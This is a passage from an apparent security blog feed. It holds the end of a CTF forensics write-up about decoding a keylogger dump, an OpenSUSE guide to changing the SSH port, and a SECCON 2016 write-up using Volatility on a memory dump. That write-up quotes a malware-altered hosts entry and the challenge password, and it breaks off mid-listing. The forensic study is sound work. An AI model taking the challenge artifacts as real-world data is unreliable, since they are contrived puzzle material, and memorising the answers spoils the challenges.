class="line">CSPCP852  ok: CSPCP852</div><div class="line">CSUNICODE  ok: CSUNICODE</div><div class="line">CWI  ok: CWI</div><div class="line">CWI-2  ok: CWI-2</div><div class="line">CYRILLIC  ok: CYRILLIC</div><div class="line">EBCDIC-CP-BE  ok: EBCDIC-CP-BE</div><div class="line">EBCDIC-CP-CA  ok: EBCDIC-CP-CA</div><div class="line">EBCDIC-CP-CH  ok: EBCDIC-CP-CH</div><div class="line">EBCDIC-CP-DK  ok: EBCDIC-CP-DK</div><div class="line">EBCDIC-CP-ES  ok: EBCDIC-CP-ES</div><div class="line">EBCDIC-CP-FI  ok: EBCDIC-CP-FI</div><div class="line">EBCDIC-CP-FR  ok: EBCDIC-CP-FR</div><div class="line">EBCDIC-CP-GB  ok: EBCDIC-CP-GB</div><div class="line">EBCDIC-CP-IS  ok: EBCDIC-CP-IS</div><div class="line">EBCDIC-CP-IT  ok: EBCDIC-CP-IT</div><div class="line">EBCDIC-CP-NL  ok: EBCDIC-CP-NL</div><div class="line">EBCDIC-CP-NO  ok: EBCDIC-CP-NO</div><div class="line">EBCDIC-CP-ROECE  ok: EBCDIC-CP-ROECE</div><div class="line">EBCDIC-CP-SE  ok: EBCDIC-CP-SE</div><div class="line">EBCDIC-CP-US  ok: EBCDIC-CP-US</div><div class="line">EBCDIC-CP-WT  ok: EBCDIC-CP-WT</div><div class="line">EBCDIC-CP-YU  ok: EBCDIC-CP-YU</div><div class="line">EBCDIC-CYRILLIC  ok: EBCDIC-CYRILLIC</div><div class="line">EBCDIC-INT1  ok: EBCDIC-INT1</div><div class="line">ECMA-128  ok: ECMA-128</div><div class="line">ECMACYRILLIC  ok: ECMACYRILLIC</div><div class="line">ECMA-CYRILLIC  ok: ECMA-CYRILLIC</div><div class="line">GEORGIAN-ACADEMY  ok: GEORGIAN-ACADEMY</div><div class="line">GEORGIAN-PS  ok: GEORGIAN-PS</div><div class="line">IBM037  ok: IBM037</div><div class="line">IBM1025  ok: IBM1025</div><div class="line">IBM-1025  ok: IBM-1025</div><div class="line">IBM1026  ok: IBM1026</div><div class="line">IBM1047  ok: IBM1047</div><div class="line">IBM-1047  ok: IBM-1047</div><div class="line">IBM1097  ok: IBM1097</div><div class="line">IBM-1097  ok: IBM-1097</div><div class="line">IBM1112  ok: IBM1112</div><div class="line">IBM-1112  ok: IBM-1112</div><div class="line">IBM1122  ok: IBM1122</div><div class="line">IBM-1122  ok: IBM-1122</div><div class="line">IBM1123  ok: IBM1123</div><div class="line">IBM-1123  ok: IBM-1123</div><div class="line">IBM1124  ok: IBM1124</div><div class="line">IBM-1124  ok: IBM-1124</div><div class="line">IBM1129  ok: IBM1129</div><div class="line">IBM-1129  ok: IBM-1129</div><div class="line">IBM1130  ok: IBM1130</div><div class="line">IBM-1130  ok: IBM-1130</div><div class="line">IBM1137  ok: IBM1137</div><div class="line">IBM-1137  ok: IBM-1137</div><div class="line">IBM1140  ok: IBM1140</div><div class="line">IBM-1140  ok: IBM-1140</div><div class="line">IBM1141  ok: IBM1141</div><div class="line">IBM-1141  ok: IBM-1141</div><div class="line">IBM1142  ok: IBM1142</div><div class="line">IBM-1142  ok: IBM-1142</div><div class="line">IBM1143  ok: IBM1143</div><div class="line">IBM-1143  ok: IBM-1143</div><div class="line">IBM1144  ok: IBM1144</div><div class="line">IBM-1144  ok: IBM-1144</div><div class="line">IBM1145  ok: IBM1145</div><div class="line">IBM-1145  ok: IBM-1145</div><div class="line">IBM1146  ok: IBM1146</div><div class="line">IBM-1146  ok: IBM-1146</div><div class="line">IBM1147  ok: IBM1147</div><div class="line">IBM-1147  ok: IBM-1147</div><div class="line">IBM1148  ok: IBM1148</div><div class="line">IBM-1148  ok: IBM-1148</div><div class="line">IBM1149  ok: IBM1149</div><div class="line">IBM-1149  ok: IBM-1149</div><div class="line">IBM1153  ok: IBM1153</div><div class="line">IBM-1153  ok: IBM-1153</div><div class="line">IBM1154  ok: IBM1154</div><div class="line">IBM-1154  ok: IBM-1154</div><div class="line">IBM1155  ok: IBM1155</div><div class="line">IBM-1155  ok: IBM-1155</div><div class="line">IBM1156  ok: IBM1156</div><div class="line">IBM-1156  ok: IBM-1156</div><div class="line">IBM1157  ok: IBM1157</div><div class="line">IBM-1157  ok: IBM-1157</div><div class="line">IBM1158  ok: IBM1158</div><div class="line">IBM-1158  ok: IBM-1158</div><div class="line">IBM1160  ok: IBM1160</div><div class="line">IBM-1160  ok: IBM-1160</div><div class="line">IBM1163  ok: IBM1163</div><div class="line">IBM-1163  ok: IBM-1163</div><div class="line">IBM1164  ok: IBM1164</div><div class="line">IBM-1164  ok: IBM-1164</div><div class="line">IBM1166  ok: IBM1166</div><div class="line">IBM-1166  ok: IBM-1166</div><div class="line">IBM1167  ok: IBM1167</div><div class="line">IBM-1167  ok: IBM-1167</div><div class="line">IBM1390  ok: IBM1390</div><div class="line">IBM-1390  ok: IBM-1390</div><div class="line">IBM1399  ok: IBM1399</div><div class="line">IBM-1399  ok: IBM-1399</div><div class="line">IBM256  ok: IBM256</div><div class="line">IBM273  ok: IBM273</div><div class="line">IBM277  ok: IBM277</div><div class="line">IBM278  ok: IBM278</div><div class="line">IBM280  ok: IBM280</div><div class="line">IBM284  ok: IBM284</div><div class="line">IBM285  ok: IBM285</div><div class="line">IBM297  ok: IBM297</div><div class="line">IBM437  ok: IBM437</div><div class="line">IBM500  ok: IBM500</div><div class="line">IBM5347  ok: IBM5347</div><div class="line">IBM-5347  ok: IBM-5347</div><div class="line">IBM775  ok: IBM775</div><div class="line">IBM819  ok: IBM819</div><div class="line">IBM848  ok: IBM848</div><div class="line">IBM850  ok: IBM850</div><div class="line">IBM851  ok: IBM851</div><div class="line">IBM852  ok: IBM852</div><div class="line">IBM855  ok: IBM855</div><div class="line">IBM860  ok: IBM860</div><div class="line">IBM861  ok: IBM861</div><div class="line">IBM862  ok: IBM862</div><div class="line">IBM863  ok: IBM863</div><div class="line">IBM865  ok: IBM865</div><div class="line">IBM866  ok: IBM866</div><div class="line">IBM866NAV  ok: IBM866NAV</div><div class="line">IBM870  ok: IBM870</div><div class="line">IBM871  ok: IBM871</div><div class="line">IBM880  ok: IBM880</div><div class="line">IBM901  ok: IBM901</div><div class="line">IBM-901  ok: IBM-901</div><div class="line">IBM902  ok: IBM902</div><div class="line">IBM-902  ok: IBM-902</div><div class="line">IBM9030  ok: IBM9030</div><div class="line">IBM-9030  ok: IBM-9030</div><div class="line">IBM912  ok: IBM912</div><div class="line">IBM915  ok: IBM915</div><div class="line">IBM920  ok: IBM920</div><div class="line">IBM921  ok: IBM921</div><div class="line">IBM-921  ok: IBM-921</div><div class="line">IBM922  ok: IBM922</div><div class="line">IBM-922  ok: IBM-922</div><div class="line">IBM9448  ok: IBM9448</div><div class="line">IBM-9448  ok: IBM-9448</div><div class="line">IEC_P271  ok: IEC_P271</div><div class="line">IEC_P27-1  ok: IEC_P27-1</div><div class="line">ISO-10646/UCS2/  ok: ISO-10646/UCS2/</div><div class="line">ISO_11548-1  ok: ISO_11548-1</div><div class="line">ISO11548-1  ok: ISO11548-1</div><div class="line">ISO6937  ok: ISO6937</div><div class="line">ISO_6937  ok: ISO_6937</div><div class="line">ISO_6937:1992  ok: ISO_6937:1992</div><div class="line">ISO88591  ok: ISO88591</div><div class="line">ISO_8859-1  ok: ISO_8859-1</div><div class="line">ISO-8859-1  ok: ISO-8859-1</div><div class="line">ISO8859-1  ok: ISO8859-1</div><div class="line">ISO885910  ok: ISO885910</div><div class="line">ISO_8859-10  ok: ISO_8859-10</div><div class="line">ISO-8859-10  ok: ISO-8859-10</div><div class="line">ISO8859-10  ok: ISO8859-10</div><div class="line">ISO_8859-10:1992  ok: ISO_8859-10:1992</div><div class="line">ISO_8859-1:1987  ok: ISO_8859-1:1987</div><div class="line">ISO885913  ok: ISO885913</div><div class="line">ISO-8859-13  ok: ISO-8859-13</div><div class="line">ISO8859-13  ok: ISO8859-13</div><div class="line">ISO885914  ok: ISO885914</div><div class="line">ISO_8859-14  ok: ISO_8859-14</div><div class="line">ISO-8859-14  ok: ISO-8859-14</div><div class="line">ISO8859-14  ok: ISO8859-14</div><div class="line">ISO_8859-14:1998  ok: ISO_8859-14:1998</div><div class="line">ISO885915  ok: ISO885915</div><div class="line">ISO_8859-15  ok: ISO_8859-15</div><div class="line">ISO-8859-15  ok: ISO-8859-15</div><div class="line">ISO8859-15  ok: ISO8859-15</div><div class="line">ISO_8859-15:1998  ok: ISO_8859-15:1998</div><div class="line">ISO885916  ok: ISO885916</div><div class="line">ISO_8859-16  ok: ISO_8859-16</div><div class="line">ISO-8859-16  ok: ISO-8859-16</div><div class="line">ISO8859-16  ok: ISO8859-16</div><div class="line">ISO_8859-16:2001  ok: ISO_8859-16:2001</div><div class="line">ISO88592  ok: ISO88592</div><div class="line">ISO_8859-2  ok: ISO_8859-2</div><div class="line">ISO-8859-2  ok: ISO-8859-2</div><div class="line">ISO8859-2  ok: ISO8859-2</div><div class="line">ISO_8859-2:1987  ok: ISO_8859-2:1987</div><div class="line">ISO88594  ok: ISO88594</div><div class="line">ISO_8859-4  ok: ISO_8859-4</div><div class="line">ISO-8859-4  ok: ISO-8859-4</div><div class="line">ISO8859-4  ok: ISO8859-4</div><div class="line">ISO_8859-4:1988  ok: ISO_8859-4:1988</div><div class="line">ISO88595  ok: ISO88595</div><div class="line">ISO_8859-5  ok: ISO_8859-5</div><div class="line">ISO-8859-5  ok: ISO-8859-5</div><div class="line">ISO8859-5  ok: ISO8859-5</div><div class="line">ISO_8859-5:1988  ok: ISO_8859-5:1988</div><div class="line">ISO88599  ok: ISO88599</div><div class="line">ISO_8859-9  ok: ISO_8859-9</div><div class="line">ISO-8859-9  ok: ISO-8859-9</div><div class="line">ISO8859-9  ok: ISO8859-9</div><div class="line">ISO_8859-9:1989  ok: ISO_8859-9:1989</div><div class="line">ISO88599E  ok: ISO88599E</div><div class="line">ISO_8859-9E  ok: ISO_8859-9E</div><div class="line">ISO-8859-9E  ok: ISO-8859-9E</div><div class="line">ISO8859-9E  ok: ISO8859-9E</div><div class="line">ISO-CELTIC  ok: ISO-CELTIC</div><div class="line">ISO-IR-100  ok: ISO-IR-100</div><div class="line">ISO-IR-101  ok: ISO-IR-101</div><div class="line">ISO-IR-110  ok: ISO-IR-110</div><div class="line">ISO-IR-111  ok: ISO-IR-111</div><div class="line">ISO-IR-139  ok: ISO-IR-139</div><div class="line">ISO-IR-143  ok: ISO-IR-143</div><div class="line">ISO-IR-144  ok: ISO-IR-144</div><div class="line">ISO-IR-148  ok: ISO-IR-148</div><div class="line">ISO-IR-156  ok: ISO-IR-156</div><div class="line">ISO-IR-157  ok: ISO-IR-157</div><div class="line">ISO-IR-179  ok: ISO-IR-179</div><div class="line">ISO-IR-199  ok: ISO-IR-199</div><div class="line">ISO-IR-203  ok: ISO-IR-203</div><div class="line">ISO-IR-226  ok: ISO-IR-226</div><div class="line">ISO/TR_11548-1/  ok: ISO/TR_11548-1/</div><div class="line">KOI8R  ok: KOI8R</div><div class="line">KOI8-R  ok: KOI8-R</div><div class="line">KOI8-RU  ok: KOI8-RU</div><div class="line">KOI8U  ok: KOI8U</div><div class="line">KOI8-U  ok: KOI8-U</div><div class="line">L1  ok: L1</div><div class="line">L10  ok: L10</div><div class="line">L2  ok: L2</div><div class="line">L4  ok: L4</div><div class="line">L5  ok: L5</div><div class="line">L6  ok: L6</div><div class="line">L7  ok: L7</div><div class="line">L8  ok: L8</div><div class="line">LATIN1  ok: LATIN1</div><div class="line">LATIN10  ok: LATIN10</div><div class="line">LATIN2  ok: LATIN2</div><div class="line">LATIN4  ok: LATIN4</div><div class="line">LATIN5  ok: LATIN5</div><div class="line">LATIN6  ok: LATIN6</div><div class="line">LATIN7  ok: LATIN7</div><div class="line">LATIN8  ok: LATIN8</div><div class="line">LATIN9  ok: LATIN9</div><div class="line">LATIN-9  ok: LATIN-9</div><div class="line">MAC  ok: MAC</div><div class="line">MAC-CENTRALEUROPE  ok: MAC-CENTRALEUROPE</div><div class="line">MACCYRILLIC  ok: MACCYRILLIC</div><div class="line">MAC-CYRILLIC  ok: MAC-CYRILLIC</div><div class="line">MACINTOSH  ok: MACINTOSH</div><div class="line">MACIS  ok: MACIS</div><div class="line">MAC-IS  ok: MAC-IS</div><div class="line">MAC-SAMI  ok: MAC-SAMI</div><div class="line">MACUK  ok: MACUK</div><div class="line">MAC-UK  ok: MAC-UK</div><div class="line">MACUKRAINIAN  ok: MACUKRAINIAN</div><div class="line">MIK  ok: MIK</div><div class="line">MS-ARAB  ok: MS-ARAB</div><div class="line">MS-CYRL  ok: MS-CYRL</div><div class="line">MSMACCYRILLIC  ok: MSMACCYRILLIC</div><div class="line">MS-MAC-CYRILLIC  ok: MS-MAC-CYRILLIC</div><div class="line">OSF00010001  ok: OSF00010001</div><div class="line">OSF00010002  ok: OSF00010002</div><div class="line">OSF00010004  ok: OSF00010004</div><div class="line">OSF00010005  ok: OSF00010005</div><div class="line">OSF00010009  ok: OSF00010009</div><div class="line">OSF0001000A  ok: OSF0001000A</div><div class="line">OSF00010100  ok: OSF00010100</div><div class="line">OSF00010101  ok: OSF00010101</div><div class="line">OSF00010102  ok: OSF00010102</div><div class="line">OSF10020025  ok: OSF10020025</div><div class="line">OSF10020111  ok: OSF10020111</div><div class="line">OSF10020115  ok: OSF10020115</div><div class="line">OSF10020116  ok: OSF10020116</div><div class="line">OSF10020118  ok: OSF10020118</div><div class="line">OSF1002011C  ok: OSF1002011C</div><div class="line">OSF1002011D  ok: OSF1002011D</div><div class="line">OSF10020129  ok: OSF10020129</div><div class="line">OSF100201B5  ok: OSF100201B5</div><div class="line">OSF100201F4  ok: OSF100201F4</div><div class="line">OSF10020352  ok: OSF10020352</div><div class="line">OSF10020354  ok: OSF10020354</div><div class="line">OSF10020357  ok: OSF10020357</div><div class="line">OSF1002035D  ok: OSF1002035D</div><div class="line">OSF1002035E  ok: OSF1002035E</div><div class="line">OSF1002035F  ok: OSF1002035F</div><div class="line">OSF10020366  ok: OSF10020366</div><div class="line">OSF10020367  ok: OSF10020367</div><div class="line">OSF10020370  ok: OSF10020370</div><div class="line">OSF10020402  ok: OSF10020402</div><div class="line">OSF10020417  ok: OSF10020417</div><div class="line">PT154  ok: PT154</div><div class="line">RK1048  ok: RK1048</div><div class="line">RUSCII  ok: RUSCII</div><div class="line">STRK1048-2002  ok: STRK1048-2002</div><div class="line">TCVN  ok: TCVN</div><div class="line">TCVN-5712  ok: TCVN-5712</div><div class="line">TCVN5712-1  ok: TCVN5712-1</div><div class="line">TCVN5712-1:1993  ok: TCVN5712-1:1993</div><div class="line">TS-5881  ok: TS-5881</div><div class="line">UCS2  ok: UCS2</div><div class="line">UCS-2  ok: UCS-2</div><div class="line">UCS-2BE  ok: UCS-2BE</div><div class="line">UCS-2LE  ok: UCS-2LE</div><div class="line">UNICODE  ok: UNICODE</div><div class="line">UNICODEBIG  ok: UNICODEBIG</div><div class="line">UNICODELITTLE  ok: UNICODELITTLE</div><div class="line">UTF16  ok: UTF16</div><div class="line">UTF-16  ok: UTF-16</div><div class="line">UTF16BE  ok: UTF16BE</div><div class="line">UTF-16BE  ok: UTF-16BE</div><div class="line">UTF16LE  ok: UTF16LE</div><div class="line">UTF-16LE  ok: UTF-16LE</div><div class="line">VISCII  ok: VISCII</div><div class="line">WINDOWS-1251  ok: WINDOWS-1251</div><div class="line">WINDOWS-1256  ok: WINDOWS-1256</div></pre></td></tr></table></figure></p>
<ul>
<li>
<p>Tried UTF-16, UNICODELITTLE, UNICODE, LATIN1, ISO-8859-1 WINDOWS-1251, CP1251 with <code>iconv</code>.</p>
</li>
<li>
<p>Tried <code>enca</code> recognition:
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ enca -f keylog.log_file.None.0x80eb7008.dat</div><div class="line">enca: Cannot determine (or understand) your language preferences.</div><div class="line">Please use `-L language&apos;, or `-L none&apos; if your language is not supported</div><div class="line">(only a few multibyte encodings can be recognized then).</div><div class="line">Run `enca --list languages&apos; to get a list of supported languages.</div></pre></td></tr></table></figure></p>
</li>
<li>
<p>Tried <code>chardet</code> (not even a relevent output):</p>
</li>
</ul>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ chardetect keylog.log_file.None.0x80eb7008.dat</div><div class="line">keylog.log_file.None.0x80eb7008.dat: windows-1253 with confidence 0.3253156807138245</div></pre></td></tr></table></figure></p>
<h2 id="submit">Submit</h2>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>OpenSUSE : change ssh port / use a cutom ssh port</title>
    <link href="http://rawsec.ml/en/opensuse-change-ssh-port/"/>
    <id>http://rawsec.ml/en/opensuse-change-ssh-port/</id>
    <published>2016-12-13T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.882Z</updated>
    
    <content type="html"><![CDATA[<p>For this exemple, our custom ssh port will be <strong>52222</strong>.</p>
<p>Edit <code>/etc/ssh/sshd_config</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>Uncomment <code>Port 22</code> and change it to <code>Port 52222</code>.</p>
<p><strong>Note</strong>: You can add several times the <em>Port</em> directive to allow several ports. This can be usefull first to not be locked out of teh server. For example:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Port 22</div><div class="line">Port 52222</div></pre></td></tr></table></figure></p>
<p>Restart the ssh deamon:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
<p>Do not close your current ssh session and test if you can localy connect via ssh with the new port:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@localhost -p 52222</div></pre></td></tr></table></figure></p>
<p>If it works you can <code>exit</code> the test ssh connection.</p>
<p>Now we will need to allow this new port in the firewall.</p>
<p>To do so, edit <code>/etc/sysconfig/SuSEfirewall2.d/services/sshd</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/sysconfig/SuSEfirewall2.d/services/sshd</div></pre></td></tr></table></figure></p>
<p>Change <code>TCP=&quot;ssh&quot;</code> to <code>TCP=&quot;52222&quot;</code> (this will only allow port 52222 for ssh) or to <code>TCP=&quot;ssh 52222&quot;</code> if you want both ports.</p>
<p><strong>Note</strong>: this is possible because there is <code>FW_CONFIGURATIONS_EXT=&quot;sshd&quot;</code> in your <code>/etc/sysconfig/SuSEfirewall2</code> config file. Known terms (mapping between well known ports and services, ex: ssh=22) are in <code>/etc/services</code>, it's not advised to modify this file.</p>
<p>Now restart the firewall:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># systemctl restart SuSEfirewall2.service</div><div class="line">or</div><div class="line"># rcSuSEfirewall2 restart</div></pre></td></tr></table></figure></p>
<p><strong>Question</strong>: Why did we tested local ssh connection before modifying the firewall rules? Because the change we made only affects external connections (i.e. from the internet) so local connection are not restricted by firewall port filtering.</p>
<p>Now we can safely exit the remote ssh connection.</p>
<p>Now to connect to the server we have to specify the ssh port:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh user@example.org -p 52222</div></pre></td></tr></table></figure></p>
<p>or add a custom entry in <code>.ssh/config</code> (single user) or <code>/etc/ssh_config</code> (all users):</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Host host_alias</div><div class="line">    Hostname example.org</div><div class="line">    Port 52222</div><div class="line">    User user</div></pre></td></tr></table></figure></p>
<p>and simply connect with:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh host_alias</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;For this exemple, our custom ssh port will be &lt;strong&gt;52222&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Edit &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure class
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/categories/linux/opensuse/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="opensuse" scheme="http://rawsec.ml/tags/opensuse/"/>
    
  </entry>
  
  <entry>
    <title>SECCON - 100 - Memory Analysis - Forensics</title>
    <link href="http://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/"/>
    <id>http://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/</id>
    <published>2016-12-09T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.868Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : SECCON 2016 Online CTF</li>
<li><strong>Website</strong> : <a href="http://2016.seccon.jp/news/#124" target="_blank" rel="external">seccon.jp</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/354/" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Find the website that the fake svchost is accessing.</p>
<p>You can get the flag if you access the website!!</p>
<p>The challenge files are huge, please download it first.</p>
<p>Hint1: <a href="http://www.volatilityfoundation.org/" target="_blank" rel="external">http://www.volatilityfoundation.org/</a></p>
<p>Hint2: Check the hosts file</p>
<p>password: fjliejflsjiejlsiejee33cnc</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>For this challenge, we get a zip file wih a raw memory dump inside named <em>forensic_100.raw</em>.</p>
<p>First, let's determine which OS is this dump come from :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw imageinfo</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div class="line">                     AS Layer2 : FileAddressSpace (/media/sf_Challenges/CTF/SECCON/forensic_100.raw)</div><div class="line">                      PAE type : PAE</div><div class="line">                           DTB : 0x34c000L</div><div class="line">                          KDBG : 0x80545ce0L</div><div class="line">          Number of Processors : 1</div><div class="line">     Image Type (Service Pack) : 3</div><div class="line">                KPCR for CPU 0 : 0xffdff000L</div><div class="line">             KUSER_SHARED_DATA : 0xffdf0000L</div><div class="line">           Image date and time : 2016-12-06 05:28:47 UTC+0000</div><div class="line">     Image local date and time : 2016-12-06 14:28:47 +0900</div></pre></td></tr></table></figure></p>
<p>Check the hosts file as the second hint say :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000217b748 --dump-dir=.</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">DataSectionObject 0x0217b748   None   \Device\HarddiskVolume1\WINDOWS\system32\drivers\etc\hosts</div><div class="line"></div><div class="line">➜ ls</div><div class="line">file.None.0x819a3008.dat  forensic_100.raw  memoryanalysis.zip</div><div class="line"></div><div class="line">➜ cat file.None.0x819a3008.dat</div><div class="line"># Copyright (c) 1993-1999 Microsoft Corp.</div><div class="line">#</div><div class="line"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</div><div class="line">#</div><div class="line"># This file contains the mappings of IP addresses to host names. Each</div><div class="line"># entry should be kept on an individual line. The IP address should</div><div class="line"># be placed in the first column followed by the corresponding host name.</div><div class="line"># The IP address and the host name should be separated by at least one</div><div class="line"># space.</div><div class="line">#</div><div class="line"># Additionally, comments (such as these) may be inserted on individual</div><div class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</div><div class="line">#</div><div class="line"># For example:</div><div class="line">#</div><div class="line">#      102.54.94.97     rhino.acme.com          # source server</div><div class="line">#       38.25.63.10     x.acme.com              # x client host</div><div class="line"></div><div class="line">127.0.0.1       localhost</div><div class="line">153.127.200.178    crattack.tistory.com #</div></pre></td></tr></table></figure></p>
<p>So the DNS entry <a href="http://crattack.tistory.com" target="_blank" rel="external">crattack.tistory.com</a> is pointing on the 153.127.200.178 IP adress.</p>
<p>List processus to see what was running when the memory was captured :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 pstree</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">Name                                                  Pid   PPid   Thds   Hnds Time</div><div class="line">-------------------------------------------------- ------ ------ ------ ------ ----</div><div class="line"> 0x8231f698:explorer.exe                             1556   1520     15    466 2016-12-06 05:27:10 UTC+0000</div><div class="line">. 0x821f8438:vmtoolsd.exe                            1856   1556      3    129 2016-12-06 05:27:11 UTC+0000</div><div class="line">. 0x819b4380:tcpview.exe                             3308   1556      2     84 2016-12-06 05:28:42 UTC+0000</div><div class="line">. 0x82267900:rundll32.exe                            1712   1556      2    144 2016-12-06 05:27:16 UTC+0000</div><div class="line">. 0x8216a5e8:DumpIt.exe                              3740   1556      1     25 2016-12-06 05:28:46 UTC+0000</div><div class="line">. 0x82170da0:ctfmon.exe                              1872   1556      1     87 2016-12-06 05:27:11 UTC+0000</div><div class="line"> 0x823c8660:System                                      4      0     58    259 1970-01-01 00:00:00 UTC+0000</div><div class="line">. 0x81a18020:smss.exe                                 540      4      3     19 2016-12-06 05:27:04 UTC+0000</div><div class="line">.. 0x82173da0:winlogon.exe                            628    540     24    541 2016-12-06 05:27:07 UTC+0000</div><div class="line">... 0x8216e670:services.exe                           672    628     15    286 2016-12-06 05:27:07 UTC+0000</div><div class="line">.... 0x81f46238:alg.exe                              2028    672      7    104 2016-12-06 05:27:16 UTC+0000</div><div class="line">.... 0x82312450:svchost.exe                          1036    672     87   1514 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81f2cb20:wuauclt.exe                         3164   1036      5    107 2016-12-06 05:28:15 UTC+0000</div><div 